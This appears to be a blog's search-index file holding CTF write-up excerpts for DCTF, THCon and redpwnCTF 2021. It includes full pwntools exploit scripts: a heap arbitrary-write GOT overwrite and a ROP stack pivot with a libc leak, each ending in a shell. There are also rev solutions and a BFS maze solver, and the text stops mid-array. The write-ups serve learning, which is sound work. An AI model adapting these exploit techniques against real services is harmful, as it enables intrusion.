var store = [{
        "title": "2021 dctf write-up",
        "excerpt":"Tasks      Pwn💻            Just Another Heap (500pts)           Just Another Heap (500pts)   I couldn’t solve this one prob in time, but I want to post this solving skills. It’s hard to find, but when I found it, It’s very simple Arbitrary Write.         It has 5 user functions(create, relive, forget, change, listing).   create() has a role that makes malloc_frame(0x20) and  malloc_userinput(size). The point is, this prob has a unique fading input with this part.   puts(\"How long is your memory\"); input_lu(&amp;size);                          // no size check malloc_user = malloc(size);               // size &gt; 0x308 / forget -&gt; unsorted bin puts(\"Sometimes our memories fade and we only remember parts of them.\"); input_lu(&amp;fade);                          // no filter puts(\"Would you like to leave some space at the beginning in case you remember later?\"); if ( fade &lt;= size ) {   if ( malloc_user )   {     for ( i = 0; i &lt; fade; ++i )       malloc_user[i] = '_';   }   malloc_user += fade;   memories will be faded fade bytes with _, and user input is behind the _ strings if malloc_user is NOT 0. So, if malloc(size) returns 0, I can overwrite anywhere.   Exploit   First, set chunks that size&gt;0x408 between 2 small chunks to leak libc from main_arena+xx.   And make 1 tcache and 0x410 unsorted bin. Now main_arena+xx has written in unsorted bin.   and if I rewrite and use change() to fill fade bytes and get libc addr with relive() function.      change() function : overwrite from the beginning or behind fade _ strings   relive() function : print user input with fade _ string   Finally, Use This mentioned skills to do GOT Overwriting.      memories will be faded fade bytes with _, and user input is behind the _ strings if malloc_user is NOT 0. So, if malloc(size) returns 0, I can overwrite anywhere.    input /bin/sh\\x00 in malloc_frame[] and program will call strcspn(addr,'\\n'). Get The Shell.   Code   Here is the Exploit Code.   from pwn import *  context.log_level='debug'  def create(idx, name, size, hide, cont, important, recent):   p.recv()   p.sendline(str(1))   p.recv()   p.sendline(str(idx))   p.recv()   p.sendline(name)   p.recv()   p.sendline(str(size))   p.recv()   p.sendline(str(hide))   p.recv()   p.sendline(cont)   p.recv()   p.sendline(important)   p.recv()   p.sendline(recent)  def relive(idx):   p.recv()   p.sendline(str(2))   p.recv()   p.sendline(str(idx))  def change(idx, cont):   p.recv()   p.sendline(str(4))   p.recv()   p.sendline(str(idx))   p.recv()   p.sendline(\"Y\")   p.recv()   p.send(cont)  def forget(idx):   p.recv()   p.sendline(str(3))   p.recv()   p.sendline(str(idx))  def listing():   p.recv()   p.sendline(str(5))  p=remote(\"dctf-chall-just-another-heap.westeurope.azurecontainer.io\", 7481) #p=process(\"./just_another_heap\") e=ELF(\"./just_another_heap\") l=e.libc  create(0, \"A\"*8, 0x20, 0, \"1234\", \"N\", \"N\") create(1, \"B\"*8, 0x410, 0, \"1234\", \"N\", \"N\") create(2, \"A\"*8, 0x20, 0, \"1234\", \"N\", \"N\") forget(0) forget(1) #pause() create(3, \"B\"*8, 0x410, 6, \"\", \"N\", \"N\") #pause() change(3,\"A\"*8) relive(3)  p.recvuntil(\"A\"*7+\" \") libc_base=u64(p.recv(6).ljust(8,'\\x00'))-0x3ebca0  print hex(libc_base)  create(4, \"C\"*8, libc_base, e.got['strcspn'], p64(libc_base+l.sym['system']), \"N\", \"N\") pause() p.recv() p.sendline(str(1)) p.recv() p.sendline(\"//bin/sh\\x00\") p.interactive()  ","categories": ["ctf"],
        "tags": [],
        "url": "/ctf/dctf_2021_just_another_heap/",
        "teaser": null
      },{
        "title": "2021 thcctf write-up",
        "excerpt":"Tasks      Pwn💻            Tourniquet (249pts)           Rev🔎            Mission Impossible (246pts)           Tourniquet (Pwn, 249pts)      This is stack pivot problem without overwriting RET. First, our team planned to input more than 0x48 bytes to overwrite RET.   But, it has a constraint:      fgets(size, buf, stdin) set arguments from stdin to size.. so I can’t call containing stdin.   Should bruteforce(1/16) to get correct stack pointer.   Must do stack pivot until I find a writable memory after leaking libc.   So, I just DO STACK PIVOT 3 times, and find ONE 8byte memory.   The following process is my idea to get shell..      Overwrite one byte of SFP to \\x00 using fgets() function’s \\n + \\x00.   Bruteforce correct position of RBP. and ROP with puts to get libc.   stack pivot to main(mov rbp, rsp) twice (my solution in competition).(※ To go __start is another solution to get many memories that I can use for next ROP.)   find one_gadget with strings and objdump command because gem one_gadget could’t get shell on remote.   Get Shell.   Here is my payload.   from pwn import * context.log_level='debug' #context.terminal=['tmux','splitw','-h'] e=ELF(\"./tourniquet\") libc=ELF(\"./libc.so.6\") #libc=e.libc pRdi=0x00000000004006d3 pRsi_r15=0x00000000004006d1 main=e.sym['main'] puts_got=e.got['puts'] puts_plt=e.plt['puts'] setvbuf_got=e.got['setvbuf'] rdx_offset=0x0000000000001b92 pppr=0x00000000004006cc bss=0x601100 fgets=e.plt['fgets']  pay=p64(0x601100+0x40)+p64(pRdi)+p64(setvbuf_got)+p64(puts_plt)+p64(0x400627)+p64(0x601100+0x40)+p64(0x400627)+\"\\x00\"*7  while True:   try:     p=remote(\"remote2.thcon.party\", 10901)     #p=process(\"./tourniquet\")     p.sendlineafter(\"haha i'm unhackable right ?\\n\",pay)     leak=p.recvuntil(\"\\x7f\",timeout=1).ljust(8,'\\x00')     if '\\x7f' not in leak:       p.close()       continue     base=u64(leak)-libc.sym['setvbuf']     rdx=base+rdx_offset     stdin=base+libc.sym['_IO_2_1_stdin_']     one_gadget=base+0xe5418     print hex(base)     break     #pay=p64(0x4004c6)*2+p64(07+............x00000000004004c6)+p64(pRdi)+p64(setvbuf_got)+p64(puts_plt)+p64(main)+\"A\"*7   except:     p.close()     continue  pause() p.recv() p.sendline(\"1234\")  pay=p64(0)*5+p64(0x1234)+p64(one_gadget) pay=pay.ljust(0x3f,'\\x00')  p.recv() p.sendline(pay)  p.interactive()   Mission Impossible (Rev, 246pts)      extract apk and convert dex to jar using dex2jar tools.   There’s nothing ….:(   find hidden dex files in `MissionImpossibleTheme.mp3.   Get this Code with jd-gui.   package thcon21.ctf.payload;  import android.util.Base64; import java.io.UnsupportedEncodingException; import java.security.InvalidAlgorithmParameterException; import java.security.InvalidKeyException; import java.security.NoSuchAlgorithmException; import javax.crypto.BadPaddingException; import javax.crypto.Cipher; import javax.crypto.IllegalBlockSizeException; import javax.crypto.NoSuchPaddingException; import javax.crypto.spec.GCMParameterSpec; import javax.crypto.spec.SecretKeySpec;  public class MIRead {   private static final String CIPHER_ALGO = \"AES/GCM/NoPadding\";   private static final String IV = \"your_m1ssi0n\";   private static final String KEY = \"d0_you_acc3pt_it\";   private Cipher cipher = Cipher.getInstance(\"AES/GCM/NoPadding\");   private GCMParameterSpec parameterSpec = new GCMParameterSpec(128, \"your_m1ssi0n\".getBytes(\"utf-8\"));   private SecretKeySpec secretKeySpec = new SecretKeySpec(\"d0_you_acc3pt_it\".getBytes(\"utf-8\"), \"AES\");      public MIRead()     throws NoSuchPaddingException, NoSuchAlgorithmException, UnsupportedEncodingException   {}      public String decrypt(String paramString)     throws UnsupportedEncodingException, BadPaddingException, IllegalBlockSizeException, InvalidAlgorithmParameterException, InvalidKeyException   {     paramString = Base64.decode(paramString.getBytes(\"UTF-8\"), 0);     this.cipher.init(2, this.secretKeySpec, this.parameterSpec);     return new String(this.cipher.doFinal(paramString));   }      public String encrypt(String paramString)     throws UnsupportedEncodingException, BadPaddingException, IllegalBlockSizeException, InvalidAlgorithmParameterException, InvalidKeyException   {     this.cipher.init(1, this.secretKeySpec, this.parameterSpec);     return new String(Base64.encode(this.cipher.doFinal(paramString.getBytes(\"utf-8\")), 0));   } }   public static void main(String[] paramArrayOfString)   {     testFlag();     paramArrayOfString = paramArrayOfString[0];     while (0 != 0) {}     Object localObject = new StringBuilder();     ((StringBuilder)localObject).append(\"IkUegPuai+gfBce7nTf\");     if (\"IkUegPuai+gfBce7nTf\" != \"VEhDb24yMQo=\")     {       ((StringBuilder)localObject).append(\"CkMZzZSwne3X3mnyrc5oBcD2yGHUXy\");     }     else     {       ((StringBuilder)localObject).append(\"MissionImpossible\");       return;     }     ((StringBuilder)localObject).append(\"MMcjCaXX2AAY20H\");     localObject = ((StringBuilder)localObject).toString();     if (paramArrayOfString.equals(\"MissionImpossible\")) {       System.out.println((String)localObject);     }   }   The secret code is IkUegPuai+gfBce7nTfCkMZzZSwne3X3mnyrc5oBcD2yGHUXyMMcjCaXX2AAY20H. Then, how to decrypt? → this file uses AES/GCM/NoPadding Mode. So I find python code in google. So I modified code and get flag.   from Crypto.Cipher import AES import base64  def print_hex_bytes(name, byte_array):     print('{} len[{}]: '.format(name, len(byte_array)), end='')     for idx, c in enumerate(byte_array):         print(\"{:02x}\".format(int(c)), end='')     print(\"\")  def dec(key, aad, nonce, cipher_data, mac):     print('\\nenter dec function ---------------------------------')     cipher = AES.new(key, AES.MODE_GCM, nonce)      try:         plain_data = cipher.decrypt(cipher_data)         print_hex_bytes('plain_data', plain_data)         print('exit dec function ---------------------------------')               return plain_data      except ValueError:         print (\"Key incorrect\")         print('exit dec function ---------------------------------')         return None  if __name__ == \"__main__\":     key   = b\"d0_you_acc3pt_it\"     aad   = bytes([0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0A,0x0B,0x0C,0x0D,0x0E]) #     nonce = b\"your_m1ssi0n\"      cipher_data  = base64.b64decode(b\"IkUegPuai+gfBce7nTfCkMZzZSwne3X3mnyrc5oBcD2yGHUXyMMcjCaXX2AAY20H\")     mac = bytes([0xb3, 0x5e, 0x5b, 0x00, 0xe4, 0x11, 0x54, 0x39, 0xa3, 0xf8, 0xf9, 0xfb, 0xa3, 0x75, 0xd5, 0xe8])         print_hex_bytes('key', key)     print_hex_bytes('aad', aad)     print_hex_bytes('nonce', nonce)     print_hex_bytes('cipher data', cipher_data)     print_hex_bytes('mac', mac)      result = dec(key, aad, nonce, cipher_data, mac)     if result is not None:         print('\\nDecrypted value:')         print_hex_bytes('\\tresult(plain data)', result)   /mnt/d/CTF_List/2021/thcctf/rev/mission_impossible master* ⇣ ❯ python3 ex.py key len[16]: 64305f796f755f6163633370745f6974 aad len[14]: 0102030405060708090a0b0c0d0e nonce len[12]: 796f75725f6d31737369306e cipher data len[48]: 22451e80fb9a8be81f05c7bb9d37c290c673652c277b75f79a7cab739a01703db2187517c8c31c8c26975f6000636d07 mac len[16]: b35e5b00e4115439a3f8f9fba375d5e8  enter dec function --------------------------------- plain_data len[48]: 5448436f6e32317b546831732d5761732d506f737331626c652d466f722d557d8c0cda62bc921356ee356da0fe457d63 exit dec function ---------------------------------  Decrypted value:         result(plain data) len[48]: 5448436f6e32317b546831732d5761732d506f737331626c652d466f722d557d8c0cda62bc921356ee356da0fe457d63  /mnt/d/CTF_List/2021/thcctf/rev/mission_impossible master* ⇣ ❯ python3 Python 3.8.5 (default, Jul 28 2020, 12:59:40)  [GCC 9.3.0] on linux Type \"help\", \"copyright\", \"credits\" or \"license\" for more information.   &gt;&gt;&gt; bytes.fromhex(\"5448436f6e32317b546831732d5761732d506f737331626c652d466f722d557d8c0cda62bc921356ee356da0fe457d63\") b'THCon21{Th1s-Was-Poss1ble-For-U}\\x8c\\x0c\\xdab\\xbc\\x92\\x13V\\xee5m\\xa0\\xfeE}c'  ","categories": ["ctf"],
        "tags": [],
        "url": "/ctf/thcctf_2021_pwn_rev/",
        "teaser": null
      },{
        "title": "2021 redpwnCTF write-up",
        "excerpt":"Tasks     Rev 🔎            bread-making (108 pts)       dimensionality (144 pts)           Web 🎧            cool (122 pts)           Rev/bread-making (108pts)  this prob has a lot of string data, so I just picked the right answer on each situation to get final flag.   Just analyze binary and submit sentences with right sequence.   from pwn import *  context.log_level='debug'  p=remote(\"mc.ax\", 31796)  a=[\"add flour\",   \"add yeast\",   \"add salt\",   \"add water\",   \"hide the bowl inside a box\",   \"wait 3 hours\",   \"work in the basement\",   \"preheat the toaster oven\",   \"set a timer on your phone\",   \"watch the bread bake\",   \"pull the tray out with a towel\",   \"unplug the oven\",   \"unplug the fire alarm\",   \"open the window\",   \"wash the sink\",   \"clean the counters\",   \"flush the bread down the toilet\",   \"get ready to sleep\",   \"close the window\",   \"replace the fire alarm\",   \"brush teeth and go to bed\" ]  for i in range(len(a)):     print(i)     p.recv()     p.sendline(a[i])  p.interactive()  The flag is flag{m4yb3_try_f0ccac1a_n3xt_t1m3???0r_dont_b4k3_br3ad_at_m1dnight}   Rev/dimensionality (144pts)   bool __fastcall check(char *a1, __int64 a2, int a3) {   int v3; // er8   __int64 v4; // rax   int v5; // er9   char v6; // al   char *v7; // rcx   int v8; // esi   bool result; // al   char v10; // r12    v3 = dword_408C * dword_408C * dword_408C; // dword_408C = 11   if ( v3 &gt; 0 )   {     v4 = 1LL;     while ( 1 )     {       v5 = v4;       if ( v3 == v4 )         break;       if ( *(&amp;unk_207F + ++v4) == 2 )       {         a3 = v5;         break;       }     }   }   v6 = *a1;   v7 = a1 + 1;   v8 = dword_408C * dword_408C;   if ( *a1 )   {     while ( 1 )     {       switch ( v6 )       {         case 'b':           v8 = -(dword_408C * dword_408C);           break;         case 'd':           v8 = dword_408C;           break;         case 'f':           v8 = dword_408C * dword_408C;           break;         case 'l':           v8 = -1;           break;         case 'r':           v8 = 1;           break;         case 'u':           v8 = -dword_408C;           break;         default:           break;       }       a3 += v8;       result = a3 &lt; 0 || a3 &gt; v3;       if ( result )         break;       v10 = byte_2080[a3];       if ( !v10 )         return result;       v6 = *v7++;       if ( !v6 )         goto LABEL_12;     }     result = 0;   }   else   {     v10 = byte_2080[a3]; LABEL_12:     result = v10 == 3;   }   return result; }   I found a map (in unk_207F) involved 0,1,2,3 digits.  When I analyzed this binary, i found the goal : escape maze with 6 commands from 2 to 3.  (using f,b,d,u,r,l)     f → cur+121  b → cur-121  d → cur+11  u → cur-11  r -&gt; cur+1  l -&gt; cur-1    this prob can input command string upto length 29bytes, so I have to find a way that escape efficiently.   The player is currently located at 2. It is only possible to go to 1 or 3 instead of 0 through the command, and since it is inefficient to go back the way it has already been done, so using the breadth-first search(BFS) algorithm can reduce the number of cases.   Here’s my payload and I found 6 answers of this prob in 0.5 sec. one of these answers should print correct flag.   from pwn import * a=[0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x1, 0x1, 0x1, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x1, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x1, 0x1, 0x0, 0x1, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x1, 0x1, 0x1, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x1, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x1, 0x1, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x1, 0x1, 0x1, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x1, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x1, 0x0, 0x1, 0x1, 0x1, 0x0, 0x1, 0x1, 0x1, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x1, 0x0, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x1, 0x0, 0x1, 0x1, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x1, 0x0, 0x1, 0x1, 0x1, 0x0, 0x1, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x1, 0x1, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0]  cur=a.index(2) queue=[[cur,[cur]]] print queue st=0 en=1 while st&lt;en:   if a[queue[st][0]]==3:     print str(queue[st][1])   if 0 &lt;= queue[st][0]+1 &lt;= 1331 and (a[queue[st][0]+1]==1 or a[queue[st][0]+1]==3) and queue[st][0]+1 not in queue[st][1]:     if len(queue[st][1])==30:       pass     else:       temp=queue[st][1][:]       temp.append(queue[st][0]+1)       #print(queue[st][1])       queue.append([queue[st][0]+1, temp])       en+=1   if 0 &lt;= queue[st][0]-1 &lt;= 1331 and (a[queue[st][0]-1]==1 or a[queue[st][0]-1]==3) and queue[st][0]-1 not in queue[st][1]:     if len(queue[st][1])==30:       pass     else:       temp=queue[st][1][:]       temp.append(queue[st][0]-1)       #print(queue[st][1])       queue.append([queue[st][0]-1, temp])       en+=1   if 0 &lt;= queue[st][0]+11 &lt;= 1331 and (a[queue[st][0]+11]==1 or a[queue[st][0]+11]==3) and queue[st][0]+11 not in queue[st][1]:     if len(queue[st][1])==30:       pass     else:       temp=queue[st][1][:]       temp.append(queue[st][0]+11)       #print(queue[st][1])       queue.append([queue[st][0]+11, temp])       en+=1   if 0 &lt;= queue[st][0]-11 &lt;= 1331 and (a[queue[st][0]-11]==1 or a[queue[st][0]-11]==3) and queue[st][0]-11 not in queue[st][1]:     if len(queue[st][1])==30:       pass     else:       temp=queue[st][1][:]       temp.append(queue[st][0]-11)       #print(queue[st][1])       queue.append([queue[st][0]-11, temp])       en+=1   if 0 &lt;= queue[st][0]+121 &lt;= 1331 and (a[queue[st][0]+121]==1 or a[queue[st][0]+121]==3) and queue[st][0]+121 not in queue[st][1]:     if len(queue[st][1])==30:       pass     else:       temp=queue[st][1][:]       temp.append(queue[st][0]+121)       #print(queue[st][1])       queue.append([queue[st][0]+121, temp])       en+=1   if 0 &lt;= queue[st][0]-121 &lt;= 1331 and (a[queue[st][0]-121]==1 or a[queue[st][0]-121]==3) and queue[st][0]-121 not in queue[st][1]:     if len(queue[st][1])==30:       pass     else:       temp=queue[st][1][:]       temp.append(queue[st][0]-121)       #print(queue[st][1])       queue.append([queue[st][0]-121, temp])       en+=1   st+=1   #print st,en  the third answer is correct input to get flag.  #a=[84, 205, 206, 207, 328, 449, 448, 447, 446, 445, 566, 687, 698, 709, 830, 951, 952, 953, 1074, 1195, 1184, 1173, 1052, 931, 932, 933, 1054, 1175, 1296] #a=[84, 205, 206, 207, 328, 449, 448, 447, 568, 689, 688, 687, 698, 709, 830, 951, 952, 953, 1074, 1195, 1184, 1173, 1052, 931, 932, 933, 1054, 1175, 1296] a=[84, 205, 206, 207, 328, 449, 448, 447, 568, 689, 700, 711, 710, 709, 830, 951, 952, 953, 1074, 